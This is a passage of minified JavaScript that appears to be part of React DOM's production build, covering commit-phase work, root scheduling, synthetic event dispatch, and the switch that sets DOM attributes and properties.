              , e = (t.flags & 13878) !== 0;
            if ((t.subtreeFlags & 13878) !== 0 || e) {
                e = p.T,
                p.T = null;
                var a = A.p;
                A.p = 2;
                var u = nl;
                nl |= 4;
                try {
                    td(t, l);
                    var n = Kc
                      , i = is(l.containerInfo)
                      , c = n.focusedElem
                      , s = n.selectionRange;
                    if (i !== c && c && c.ownerDocument && ns(c.ownerDocument.documentElement, c)) {
                        if (s !== null && vi(c)) {
                            var y = s.start
                              , S = s.end;
                            if (S === void 0 && (S = y),
                            "selectionStart"in c)
                                c.selectionStart = y,
                                c.selectionEnd = Math.min(S, c.value.length);
                            else {
                                var x = c.ownerDocument || document
                                  , v = x && x.defaultView || window;
                                if (v.getSelection) {
                                    var g = v.getSelection()
                                      , j = c.textContent.length
                                      , q = Math.min(s.start, j)
                                      , ml = s.end === void 0 ? q : Math.min(s.end, j);
                                    !g.extend && q > ml && (i = ml,
                                    ml = q,
                                    q = i);
                                    var m = us(c, q)
                                      , o = us(c, ml);
                                    if (m && o && (g.rangeCount !== 1 || g.anchorNode !== m.node || g.anchorOffset !== m.offset || g.focusNode !== o.node || g.focusOffset !== o.offset)) {
                                        var h = x.createRange();
                                        h.setStart(m.node, m.offset),
                                        g.removeAllRanges(),
                                        q > ml ? (g.addRange(h),
                                        g.extend(o.node, o.offset)) : (h.setEnd(o.node, o.offset),
                                        g.addRange(h))
                                    }
                                }
                            }
                        }
                        for (x = [],
                        g = c; g = g.parentNode; )
                            g.nodeType === 1 && x.push({
                                element: g,
                                left: g.scrollLeft,
                                top: g.scrollTop
                            });
                        for (typeof c.focus == "function" && c.focus(),
                        c = 0; c < x.length; c++) {
                            var b = x[c];
                            b.element.scrollLeft = b.left,
                            b.element.scrollTop = b.top
                        }
                    }
                    qn = !!Vc,
                    Kc = Vc = null
                } finally {
                    nl = u,
                    A.p = a,
                    p.T = e
                }
            }
            l.current = t,
            Ml = 2
        }
    }
    function zd() {
        if (Ml === 2) {
            Ml = 0;
            var l = ve
              , t = Ea
              , e = (t.flags & 8772) !== 0;
            if ((t.subtreeFlags & 8772) !== 0 || e) {
                e = p.T,
                p.T = null;
                var a = A.p;
                A.p = 2;
                var u = nl;
                nl |= 4;
                try {
                    $o(l, t.alternate, t)
                } finally {
                    nl = u,
                    A.p = a,
                    p.T = e
                }
            }
            Ml = 3
        }
    }
    function Ed() {
        if (Ml === 4 || Ml === 3) {
            Ml = 0,
            Hr();
            var l = ve
              , t = Ea
              , e = It
              , a = sd;
            (t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0 ? Ml = 5 : (Ml = 0,
            Ea = ve = null,
            Td(l, l.pendingLanes));
            var u = l.pendingLanes;
            if (u === 0 && (ye = null),
            Fn(e),
            t = t.stateNode,
            at && typeof at.onCommitFiberRoot == "function")
                try {
                    at.onCommitFiberRoot(Na, t, void 0, (t.current.flags & 128) === 128)
                } catch {}
            if (a !== null) {
                t = p.T,
                u = A.p,
                A.p = 2,
                p.T = null;
                try {
                    for (var n = l.onRecoverableError, i = 0; i < a.length; i++) {
                        var c = a[i];
                        n(c.value, {
                            componentStack: c.stack
                        })
                    }
                } finally {
                    p.T = t,
                    A.p = u
                }
            }
            (It & 3) !== 0 && An(),
            Ct(l),
            u = l.pendingLanes,
            (e & 261930) !== 0 && (u & 42) !== 0 ? l === Nc ? ru++ : (ru = 0,
            Nc = l) : ru = 0,
            mu(0)
        }
    }
    function Td(l, t) {
        (l.pooledCacheLanes &= t) === 0 && (t = l.pooledCache,
        t != null && (l.pooledCache = null,
        wa(t)))
    }
    function An() {
        return xd(),
        zd(),
        Ed(),
        Ad()
    }
    function Ad() {
        if (Ml !== 5)
            return !1;
        var l = ve
          , t = Oc;
        Oc = 0;
        var e = Fn(It)
          , a = p.T
          , u = A.p;
        try {
            A.p = 32 > e ? 32 : e,
            p.T = null,
            e = Dc,
            Dc = null;
            var n = ve
              , i = It;
            if (Ml = 0,
            Ea = ve = null,
            It = 0,
            (nl & 6) !== 0)
                throw Error(r(331));
            var c = nl;
            if (nl |= 4,
            id(n.current),
            ad(n, n.current, i, e),
            nl = c,
            mu(0, !1),
            at && typeof at.onPostCommitFiberRoot == "function")
                try {
                    at.onPostCommitFiberRoot(Na, n)
                } catch {}
            return !0
        } finally {
            A.p = u,
            p.T = a,
            Td(l, t)
        }
    }
    function Md(l, t, e) {
        t = gt(e, t),
        t = sc(l.stateNode, t, 2),
        l = se(l, t, 2),
        l !== null && (Ra(l, 2),
        Ct(l))
    }
    function sl(l, t, e) {
        if (l.tag === 3)
            Md(l, l, e);
        else
            for (; t !== null; ) {
                if (t.tag === 3) {
                    Md(t, l, e);
                    break
                } else if (t.tag === 1) {
                    var a = t.stateNode;
                    if (typeof t.type.getDerivedStateFromError == "function" || typeof a.componentDidCatch == "function" && (ye === null || !ye.has(a))) {
                        l = gt(e, l),
                        e = jo(2),
                        a = se(t, e, 2),
                        a !== null && (_o(e, a, t, l),
                        Ra(a, 2),
                        Ct(a));
                        break
                    }
                }
                t = t.return
            }
    }
    function Cc(l, t, e) {
        var a = l.pingCache;
        if (a === null) {
            a = l.pingCache = new cm;
            var u = new Set;
            a.set(t, u)
        } else
            u = a.get(t),
            u === void 0 && (u = new Set,
            a.set(t, u));
        u.has(e) || (Mc = !0,
        u.add(e),
        l = rm.bind(null, l, t, e),
        t.then(l, l))
    }
    function rm(l, t, e) {
        var a = l.pingCache;
        a !== null && a.delete(t),
        l.pingedLanes |= l.suspendedLanes & e,
        l.warmLanes &= ~e,
        hl === l && (F & e) === e && (pl === 4 || pl === 3 && (F & 62914560) === F && 300 > et() - pn ? (nl & 2) === 0 && Ta(l, 0) : jc |= e,
        za === F && (za = 0)),
        Ct(l)
    }
    function jd(l, t) {
        t === 0 && (t = bf()),
        l = Ue(l, t),
        l !== null && (Ra(l, t),
        Ct(l))
    }
    function mm(l) {
        var t = l.memoizedState
          , e = 0;
        t !== null && (e = t.retryLane),
        jd(l, e)
    }
    function hm(l, t) {
        var e = 0;
        switch (l.tag) {
        case 31:
        case 13:
            var a = l.stateNode
              , u = l.memoizedState;
            u !== null && (e = u.retryLane);
            break;
        case 19:
            a = l.stateNode;
            break;
        case 22:
            a = l.stateNode._retryCache;
            break;
        default:
            throw Error(r(314))
        }
        a !== null && a.delete(t),
        jd(l, e)
    }
    function ym(l, t) {
        return wn(l, t)
    }
    var Mn = null
      , Ma = null
      , Hc = !1
      , jn = !1
      , Bc = !1
      , Se = 0;
    function Ct(l) {
        l !== Ma && l.next === null && (Ma === null ? Mn = Ma = l : Ma = Ma.next = l),
        jn = !0,
        Hc || (Hc = !0,
        gm())
    }
    function mu(l, t) {
        if (!Bc && jn) {
            Bc = !0;
            do
                for (var e = !1, a = Mn; a !== null; ) {
                    if (l !== 0) {
                        var u = a.pendingLanes;
                        if (u === 0)
                            var n = 0;
                        else {
                            var i = a.suspendedLanes
                              , c = a.pingedLanes;
                            n = (1 << 31 - ut(42 | l) + 1) - 1,
                            n &= u & ~(i & ~c),
                            n = n & 201326741 ? n & 201326741 | 1 : n ? n | 2 : 0
                        }
                        n !== 0 && (e = !0,
                        Nd(a, n))
                    } else
                        n = F,
                        n = Du(a, a === hl ? n : 0, a.cancelPendingCommit !== null || a.timeoutHandle !== -1),
                        (n & 3) === 0 || Ua(a, n) || (e = !0,
                        Nd(a, n));
                    a = a.next
                }
            while (e);
            Bc = !1
        }
    }
    function vm() {
        _d()
    }
    function _d() {
        jn = Hc = !1;
        var l = 0;
        Se !== 0 && jm() && (l = Se);
        for (var t = et(), e = null, a = Mn; a !== null; ) {
            var u = a.next
              , n = Od(a, t);
            n === 0 ? (a.next = null,
            e === null ? Mn = u : e.next = u,
            u === null && (Ma = e)) : (e = a,
            (l !== 0 || (n & 3) !== 0) && (jn = !0)),
            a = u
        }
        Ml !== 0 && Ml !== 5 || mu(l),
        Se !== 0 && (Se = 0)
    }
    function Od(l, t) {
        for (var e = l.suspendedLanes, a = l.pingedLanes, u = l.expirationTimes, n = l.pendingLanes & -62914561; 0 < n; ) {
            var i = 31 - ut(n)
              , c = 1 << i
              , s = u[i];
            s === -1 ? ((c & e) === 0 || (c & a) !== 0) && (u[i] = Zr(c, t)) : s <= t && (l.expiredLanes |= c),
            n &= ~c
        }
        if (t = hl,
        e = F,
        e = Du(l, l === t ? e : 0, l.cancelPendingCommit !== null || l.timeoutHandle !== -1),
        a = l.callbackNode,
        e === 0 || l === t && (fl === 2 || fl === 9) || l.cancelPendingCommit !== null)
            return a !== null && a !== null && Wn(a),
            l.callbackNode = null,
            l.callbackPriority = 0;
        if ((e & 3) === 0 || Ua(l, e)) {
            if (t = e & -e,
            t === l.callbackPriority)
                return t;
            switch (a !== null && Wn(a),
            Fn(e)) {
            case 2:
            case 8:
                e = Sf;
                break;
            case 32:
                e = Mu;
                break;
            case 268435456:
                e = pf;
                break;
            default:
                e = Mu
            }
            return a = Dd.bind(null, l),
            e = wn(e, a),
            l.callbackPriority = t,
            l.callbackNode = e,
            t
        }
        return a !== null && a !== null && Wn(a),
        l.callbackPriority = 2,
        l.callbackNode = null,
        2
    }
    function Dd(l, t) {
        if (Ml !== 0 && Ml !== 5)
            return l.callbackNode = null,
            l.callbackPriority = 0,
            null;
        var e = l.callbackNode;
        if (An() && l.callbackNode !== e)
            return null;
        var a = F;
        return a = Du(l, l === hl ? a : 0, l.cancelPendingCommit !== null || l.timeoutHandle !== -1),
        a === 0 ? null : (dd(l, a, t),
        Od(l, et()),
        l.callbackNode != null && l.callbackNode === e ? Dd.bind(null, l) : null)
    }
    function Nd(l, t) {
        if (An())
            return null;
        dd(l, t, !0)
    }
    function gm() {
        Om(function() {
            (nl & 6) !== 0 ? wn(gf, vm) : _d()
        })
    }
    function qc() {
        if (Se === 0) {
            var l = da;
            l === 0 && (l = ju,
            ju <<= 1,
            (ju & 261888) === 0 && (ju = 256)),
            Se = l
        }
        return Se
    }
    function Ud(l) {
        return l == null || typeof l == "symbol" || typeof l == "boolean" ? null : typeof l == "function" ? l : Cu("" + l)
    }
    function Rd(l, t) {
        var e = t.ownerDocument.createElement("input");
        return e.name = t.name,
        e.value = t.value,
        l.id && e.setAttribute("form", l.id),
        t.parentNode.insertBefore(e, t),
        l = new FormData(l),
        e.parentNode.removeChild(e),
        l
    }
    function Sm(l, t, e, a, u) {
        if (t === "submit" && e && e.stateNode === u) {
            var n = Ud((u[wl] || null).action)
              , i = a.submitter;
            i && (t = (t = i[wl] || null) ? Ud(t.formAction) : i.getAttribute("formAction"),
            t !== null && (n = t,
            i = null));
            var c = new Yu("action","action",null,a,u);
            l.push({
                event: c,
                listeners: [{
                    instance: null,
                    listener: function() {
                        if (a.defaultPrevented) {
                            if (Se !== 0) {
                                var s = i ? Rd(u, i) : new FormData(u);
                                ac(e, {
                                    pending: !0,
                                    data: s,
                                    method: u.method,
                                    action: n
                                }, null, s)
                            }
                        } else
                            typeof n == "function" && (c.preventDefault(),
                            s = i ? Rd(u, i) : new FormData(u),
                            ac(e, {
                                pending: !0,
                                data: s,
                                method: u.method,
                                action: n
                            }, n, s))
                    },
                    currentTarget: u
                }]
            })
        }
    }
    for (var Yc = 0; Yc < bi.length; Yc++) {
        var Gc = bi[Yc]
          , pm = Gc.toLowerCase()
          , bm = Gc[0].toUpperCase() + Gc.slice(1);
        Mt(pm, "on" + bm)
    }
    Mt(ss, "onAnimationEnd"),
    Mt(os, "onAnimationIteration"),
    Mt(ds, "onAnimationStart"),
    Mt("dblclick", "onDoubleClick"),
    Mt("focusin", "onFocus"),
    Mt("focusout", "onBlur"),
    Mt(B0, "onTransitionRun"),
    Mt(q0, "onTransitionStart"),
    Mt(Y0, "onTransitionCancel"),
    Mt(rs, "onTransitionEnd"),
    Fe("onMouseEnter", ["mouseout", "mouseover"]),
    Fe("onMouseLeave", ["mouseout", "mouseover"]),
    Fe("onPointerEnter", ["pointerout", "pointerover"]),
    Fe("onPointerLeave", ["pointerout", "pointerover"]),
    _e("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")),
    _e("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),
    _e("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]),
    _e("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")),
    _e("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")),
    _e("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
    var hu = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" ")
      , xm = new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(hu));
    function Cd(l, t) {
        t = (t & 4) !== 0;
        for (var e = 0; e < l.length; e++) {
            var a = l[e]
              , u = a.event;
            a = a.listeners;
            l: {
                var n = void 0;
                if (t)
                    for (var i = a.length - 1; 0 <= i; i--) {
                        var c = a[i]
                          , s = c.instance
                          , y = c.currentTarget;
                        if (c = c.listener,
                        s !== n && u.isPropagationStopped())
                            break l;
                        n = c,
                        u.currentTarget = y;
                        try {
                            n(u)
                        } catch (S) {
                            Qu(S)
                        }
                        u.currentTarget = null,
                        n = s
                    }
                else
                    for (i = 0; i < a.length; i++) {
                        if (c = a[i],
                        s = c.instance,
                        y = c.currentTarget,
                        c = c.listener,
                        s !== n && u.isPropagationStopped())
                            break l;
                        n = c,
                        u.currentTarget = y;
                        try {
                            n(u)
                        } catch (S) {
                            Qu(S)
                        }
                        u.currentTarget = null,
                        n = s
                    }
            }
        }
    }
    function $(l, t) {
        var e = t[In];
        e === void 0 && (e = t[In] = new Set);
        var a = l + "__bubble";
        e.has(a) || (Hd(t, l, 2, !1),
        e.add(a))
    }
    function Xc(l, t, e) {
        var a = 0;
        t && (a |= 4),
        Hd(e, l, a, t)
    }
    var _n = "_reactListening" + Math.random().toString(36).slice(2);
    function Qc(l) {
        if (!l[_n]) {
            l[_n] = !0,
            jf.forEach(function(e) {
                e !== "selectionchange" && (xm.has(e) || Xc(e, !1, l),
                Xc(e, !0, l))
            });
            var t = l.nodeType === 9 ? l : l.ownerDocument;
            t === null || t[_n] || (t[_n] = !0,
            Xc("selectionchange", !1, t))
        }
    }
    function Hd(l, t, e, a) {
        switch (or(t)) {
        case 2:
            var u = km;
            break;
        case 8:
            u = $m;
            break;
        default:
            u = ef
        }
        e = u.bind(null, t, e, l),
        u = void 0,
        !ci || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (u = !0),
        a ? u !== void 0 ? l.addEventListener(t, e, {
            capture: !0,
            passive: u
        }) : l.addEventListener(t, e, !0) : u !== void 0 ? l.addEventListener(t, e, {
            passive: u
        }) : l.addEventListener(t, e, !1)
    }
    function Lc(l, t, e, a, u) {
        var n = a;
        if ((t & 1) === 0 && (t & 2) === 0 && a !== null)
            l: for (; ; ) {
                if (a === null)
                    return;
                var i = a.tag;
                if (i === 3 || i === 4) {
                    var c = a.stateNode.containerInfo;
                    if (c === u)
                        break;
                    if (i === 4)
                        for (i = a.return; i !== null; ) {
                            var s = i.tag;
                            if ((s === 3 || s === 4) && i.stateNode.containerInfo === u)
                                return;
                            i = i.return
                        }
                    for (; c !== null; ) {
                        if (i = We(c),
                        i === null)
                            return;
                        if (s = i.tag,
                        s === 5 || s === 6 || s === 26 || s === 27) {
                            a = n = i;
                            continue l
                        }
                        c = c.parentNode
                    }
                }
                a = a.return
            }
        Gf(function() {
            var y = n
              , S = ni(e)
              , x = [];
            l: {
                var v = ms.get(l);
                if (v !== void 0) {
                    var g = Yu
                      , j = l;
                    switch (l) {
                    case "keypress":
                        if (Bu(e) === 0)
                            break l;
                    case "keydown":
                    case "keyup":
                        g = h0;
                        break;
                    case "focusin":
                        j = "focus",
                        g = di;
                        break;
                    case "focusout":
                        j = "blur",
                        g = di;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        g = di;
                        break;
                    case "click":
                        if (e.button === 2)
                            break l;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        g = Lf;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        g = e0;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        g = g0;
                        break;
                    case ss:
                    case os:
                    case ds:
                        g = n0;
                        break;
                    case rs:
                        g = p0;
                        break;
                    case "scroll":
                    case "scrollend":
                        g = l0;
                        break;
                    case "wheel":
                        g = x0;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        g = c0;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        g = Vf;
                        break;
                    case "toggle":
                    case "beforetoggle":
                        g = E0
                    }
                    var q = (t & 4) !== 0
                      , ml = !q && (l === "scroll" || l === "scrollend")
                      , m = q ? v !== null ? v + "Capture" : null : v;
                    q = [];
                    for (var o = y, h; o !== null; ) {
                        var b = o;
                        if (h = b.stateNode,
                        b = b.tag,
                        b !== 5 && b !== 26 && b !== 27 || h === null || m === null || (b = Ba(o, m),
                        b != null && q.push(yu(o, b, h))),
                        ml)
                            break;
                        o = o.return
                    }
                    0 < q.length && (v = new g(v,j,null,e,S),
                    x.push({
                        event: v,
                        listeners: q
                    }))
                }
            }
            if ((t & 7) === 0) {
                l: {
                    if (v = l === "mouseover" || l === "pointerover",
                    g = l === "mouseout" || l === "pointerout",
                    v && e !== ui && (j = e.relatedTarget || e.fromElement) && (We(j) || j[we]))
                        break l;
                    if ((g || v) && (v = S.window === S ? S : (v = S.ownerDocument) ? v.defaultView || v.parentWindow : window,
                    g ? (j = e.relatedTarget || e.toElement,
                    g = y,
                    j = j ? We(j) : null,
                    j !== null && (ml = H(j),
                    q = j.tag,
                    j !== ml || q !== 5 && q !== 27 && q !== 6) && (j = null)) : (g = null,
                    j = y),
                    g !== j)) {
                        if (q = Lf,
                        b = "onMouseLeave",
                        m = "onMouseEnter",
                        o = "mouse",
                        (l === "pointerout" || l === "pointerover") && (q = Vf,
                        b = "onPointerLeave",
                        m = "onPointerEnter",
                        o = "pointer"),
                        ml = g == null ? v : Ha(g),
                        h = j == null ? v : Ha(j),
                        v = new q(b,o + "leave",g,e,S),
                        v.target = ml,
                        v.relatedTarget = h,
                        b = null,
                        We(S) === y && (q = new q(m,o + "enter",j,e,S),
                        q.target = h,
                        q.relatedTarget = ml,
                        b = q),
                        ml = b,
                        g && j)
                            t: {
                                for (q = zm,
                                m = g,
                                o = j,
                                h = 0,
                                b = m; b; b = q(b))
                                    h++;
                                b = 0;
                                for (var C = o; C; C = q(C))
                                    b++;
                                for (; 0 < h - b; )
                                    m = q(m),
                                    h--;
                                for (; 0 < b - h; )
                                    o = q(o),
                                    b--;
                                for (; h--; ) {
                                    if (m === o || o !== null && m === o.alternate) {
                                        q = m;
                                        break t
                                    }
                                    m = q(m),
                                    o = q(o)
                                }
                                q = null
                            }
                        else
                            q = null;
                        g !== null && Bd(x, v, g, q, !1),
                        j !== null && ml !== null && Bd(x, ml, j, q, !0)
                    }
                }
                l: {
                    if (v = y ? Ha(y) : window,
                    g = v.nodeName && v.nodeName.toLowerCase(),
                    g === "select" || g === "input" && v.type === "file")
                        var el = If;
                    else if ($f(v))
                        if (Pf)
                            el = R0;
                        else {
                            el = N0;
                            var D = D0
                        }
                    else
                        g = v.nodeName,
                        !g || g.toLowerCase() !== "input" || v.type !== "checkbox" && v.type !== "radio" ? y && ai(y.elementType) && (el = If) : el = U0;
                    if (el && (el = el(l, y))) {
                        Ff(x, el, e, S);
                        break l
                    }
                    D && D(l, v, y),
                    l === "focusout" && y && v.type === "number" && y.memoizedProps.value != null && ei(v, "number", v.value)
                }
                switch (D = y ? Ha(y) : window,
                l) {
                case "focusin":
                    ($f(D) || D.contentEditable === "true") && (aa = D,
                    gi = y,
                    Va = null);
                    break;
                case "focusout":
                    Va = gi = aa = null;
                    break;
                case "mousedown":
                    Si = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Si = !1,
                    cs(x, e, S);
                    break;
                case "selectionchange":
                    if (H0)
                        break;
                case "keydown":
                case "keyup":
                    cs(x, e, S)
                }
                var K;
                if (mi)
                    l: {
                        switch (l) {
                        case "compositionstart":
                            var I = "onCompositionStart";
                            break l;
                        case "compositionend":
                            I = "onCompositionEnd";
                            break l;
                        case "compositionupdate":
                            I = "onCompositionUpdate";
                            break l
                        }
                        I = void 0
                    }
                else
                    ea ? Wf(l, e) && (I = "onCompositionEnd") : l === "keydown" && e.keyCode === 229 && (I = "onCompositionStart");
                I && (Kf && e.locale !== "ko" && (ea || I !== "onCompositionStart" ? I === "onCompositionEnd" && ea && (K = Xf()) : (ee = S,
                fi = "value"in ee ? ee.value : ee.textContent,
                ea = !0)),
                D = On(y, I),
                0 < D.length && (I = new Zf(I,l,null,e,S),
                x.push({
                    event: I,
                    listeners: D
                }),
                K ? I.data = K : (K = kf(e),
                K !== null && (I.data = K)))),
                (K = A0 ? M0(l, e) : j0(l, e)) && (I = On(y, "onBeforeInput"),
                0 < I.length && (D = new Zf("onBeforeInput","beforeinput",null,e,S),
                x.push({
                    event: D,
                    listeners: I
                }),
                D.data = K)),
                Sm(x, l, y, e, S)
            }
            Cd(x, t)
        })
    }
    function yu(l, t, e) {
        return {
            instance: l,
            listener: t,
            currentTarget: e
        }
    }
    function On(l, t) {
        for (var e = t + "Capture", a = []; l !== null; ) {
            var u = l
              , n = u.stateNode;
            if (u = u.tag,
            u !== 5 && u !== 26 && u !== 27 || n === null || (u = Ba(l, e),
            u != null && a.unshift(yu(l, u, n)),
            u = Ba(l, t),
            u != null && a.push(yu(l, u, n))),
            l.tag === 3)
                return a;
            l = l.return
        }
        return []
    }
    function zm(l) {
        if (l === null)
            return null;
        do
            l = l.return;
        while (l && l.tag !== 5 && l.tag !== 27);
        return l || null
    }
    function Bd(l, t, e, a, u) {
        for (var n = t._reactName, i = []; e !== null && e !== a; ) {
            var c = e
              , s = c.alternate
              , y = c.stateNode;
            if (c = c.tag,
            s !== null && s === a)
                break;
            c !== 5 && c !== 26 && c !== 27 || y === null || (s = y,
            u ? (y = Ba(e, n),
            y != null && i.unshift(yu(e, y, s))) : u || (y = Ba(e, n),
            y != null && i.push(yu(e, y, s)))),
            e = e.return
        }
        i.length !== 0 && l.push({
            event: t,
            listeners: i
        })
    }
    var Em = /\r\n?/g
      , Tm = /\u0000|\uFFFD/g;
    function qd(l) {
        return (typeof l == "string" ? l : "" + l).replace(Em, `
`).replace(Tm, "")
    }
    function Yd(l, t) {
        return t = qd(t),
        qd(l) === t
    }
    function rl(l, t, e, a, u, n) {
        switch (e) {
        case "children":
            typeof a == "string" ? t === "body" || t === "textarea" && a === "" || Pe(l, a) : (typeof a == "number" || typeof a == "bigint") && t !== "body" && Pe(l, "" + a);
            break;
        case "className":
            Uu(l, "class", a);
            break;
        case "tabIndex":
            Uu(l, "tabindex", a);
            break;
        case "dir":
        case "role":
        case "viewBox":
        case "width":
        case "height":
            Uu(l, e, a);
            break;
        case "style":
            qf(l, a, n);
            break;
        case "data":
            if (t !== "object") {
                Uu(l, "data", a);
                break
            }
        case "src":
        case "href":
            if (a === "" && (t !== "a" || e !== "href")) {
                l.removeAttribute(e);
                break
            }
            if (a == null || typeof a == "function" || typeof a == "symbol" || typeof a == "boolean") {
                l.removeAttribute(e);
                break
            }
            a = Cu("" + a),
            l.setAttribute(e, a);
            break;
        case "action":
        case "formAction":
            if (typeof a == "function") {
                l.setAttribute(e, "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");
                break
            } else
                typeof n == "function" && (e === "formAction" ? (t !== "input" && rl(l, t, "name", u.name, u, null),
                rl(l, t, "formEncType", u.formEncType, u, null),
                rl(l, t, "formMethod", u.formMethod, u, null),
                rl(l, t, "formTarget", u.formTarget, u, null)) : (rl(l, t, "encType", u.encType, u, null),
                rl(l, t, "method", u.method, u, null),
                rl(l, t, "target", u.target, u, null)));
            if (a == null || typeof a == "symbol" || typeof a == "boolean") {
                l.removeAttribute(e);
                break
            }
            a = Cu("" + a),
            l.setAttribute(e, a);
            break;
        case "onClick":
            a != null && (l.onclick = qt);
            break;
        case "onScroll":
            a != null && $("scroll", l);
            break;
        case "onScrollEnd":
            a != null && $("scrollend", l);
            break;
        case "dangerouslySetInnerHTML":
            if (a != null) {
                if (typeof a != "object" || !("__html"in a))
                    throw Error(r(61));
                if (e = a.__html,
                e != null) {
                    if (u.children != null)
                        throw Error(r(60));
                    l.innerHTML = e
                }
            }
            break;
        case "multiple":
            l.multiple = a && typeof a != "function" && typeof a != "symbol";
            break;
        case "muted":
            l.muted = a && typeof a != "function" && typeof a != "symbol";
            break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "defaultValue":
        case "defaultChecked":
        case "innerHTML":
        case "ref":
            break;
        case "autoFocus":
            break;
        case "xlinkHref":
            if (a == null || typeof a == "function" || typeof a == "boolean" || typeof a == "symbol") {
                l.removeAttribute("xlink:href");
                break
            }
            e = Cu("" + a),
            l.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", e);
            break;
        case "contentEditable":
        case "spellCheck":
        case "draggable":
        case "value":
        case "autoReverse":
        case "externalResourcesRequired":
        case "focusable":
        case "preserveAlpha":
            a != null && typeof a != "function" && typeof a != "symbol" ? l.setAttribute(e, "" + a) : l.removeAttribute(e);
            break;
        case "inert":
        case "allowFullScreen":
        case "async":
        case "autoPlay":
        case "controls":
        case "default":
        case "defer":
        case "disabled":
        case "disablePictureInPicture":
        case "disableRemotePlayback":
        case "formNoValidate":
        case "hidden":
        case "loop":
        case "noModule":
        case "noValidate":
        case "open":
        case "playsInline":
        case "readOnly":
        case "required":
        case "reversed":
        case "scoped":
        case "seamless":
        case "itemScope":
            a && typeof a != "function" && typeof a != "symbol" ? l.setAttribute(e, "") : l.removeAttribute(e);
            break;
        case "capture":
        case "download":
            a === !0 ? l.setAttribute(e, "") : a !== !1 && a != null && typeof a != "function" && typeof a != "symbol" ? l.setAttribute(e, a) : l.removeAttribute(e);
            break;
        case "cols":
        case "rows":
        case "size":
        case "span":
            a != null && typeof a != "function" && typeof a != "symbol" && !isNaN(a) && 1 <= a ? l.setAttribute(e, a) : l.removeAttribute(e);
            break;
        case "rowSpan":
        case "start":
            a == null || typeof a == "function" || typeof a == "symbol" || isNaN(a) ? l.removeAttribute(e) : l.setAttribute(e, a);
            break;
        case "popover":
            $("beforetoggle", l),
            $("toggle", l),
            Nu(l, "popover", a);
            break;
        case "xlinkActuate":
            Bt(l, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
            break;
        case "xlinkArcrole":
            Bt(l, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
            break;
        case "xlinkRole":
            Bt(l, "http://www.w3.org/1999/xlink", "xlink:role", a);
            break;
        case "xlinkShow":
            Bt(l, "http://www.w3.org/1999/xlink", "xlink:show", a);
            break;
        case "xlinkTitle":
            Bt(l, "http://www.w3.org/1999/xlink", "xlink:title", a);
            break;
        case "xlinkType":
            Bt(l, "http://www.w3.org/1999/xlink", "xlink:type", a);
            break;
        case "xmlBase":
            Bt(l, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
            break;
        case "xmlLang":
            Bt(l, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
            break;
        case "xmlSpace":
            Bt(l, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
            break;
        case "is":
            Nu(l, "is", a);
            break;
        case "innerText":
        case "textContent":
            break;
        default:
            (!(2 < e.length) || e[0] !== "o" && e[0] !== "O" || e[1] !== "n" && e[1] !== "N") && (e = Ir.get(e) || e,
            Nu(l, e, a))
        }
    }
    function Zc(l, t, e, a, u, n) {
        switch (e) {
        case "style":
            qf(l, a, n);
            break;
        case "dangerouslySetInnerHTML":
            if (a != null) {
                if (typeof a != "object" || !("__html"in a))
                    throw Error(r(61));
                if (e = a.__html,
                e != null) {
                    if (u.children != null)
                        throw Error(r(60));
                    l.innerHTML = e
                }
            }
            break;
        case "children":
            typeof a == "string" ? Pe(l, a) : (typeof a == "number" || typeof a == "bigint") && Pe(l, "" + a);
            break;
        case "onScroll":
            a != null && $("scroll", l);
            break;
        case "onScrollEnd":
            a != null && $("scrollend", l);
            break;
        case "onClick":
            a != null && (l.onclick = qt);
            break;
        case "suppressContentEditableWarning":
        case "suppressHydrationWarning":
        case "innerHTML":
        case "ref":
            break;
        case "innerText":
        case "textContent":
            break;
        default:
            if (!_f.hasOwnProperty(e))
                l: {
                    if (e[0] === "o" && e[1] === "n" && (u = e.endsWith("Capture"),
                    t = e.slice(2, u ? e.length - 7 : void 0),
                    n = l[wl] || null,
                    n = n != null ? n[e] : null,
                    typeof n == "function" && l.removeEventListener(t, n, u),
                    typeof a == "function")) {
                        typeof n != "function" && n !== null && (e in l ? l[e] = null : l.hasAttribute(e) && l.removeAttribute(e)),
                        l.addEventListener(t, a, u);
                        break l
                    }
                    e in l ? l[e] = a : a === !0 ? l.setAttribute(e, "") : Nu(l, e, a)
                }
        }
    }
    function ql(l, t, e) {
        switch (t) {
        case "div":
        case "span":
        case "svg":
        case "path":
        case "a":
        case "g":
        case "p":
        case "li":
            break;
        case "img":
            $("error", l),
            $("load", l);
            var a = !1, u = !1, n;
            for (n in e)
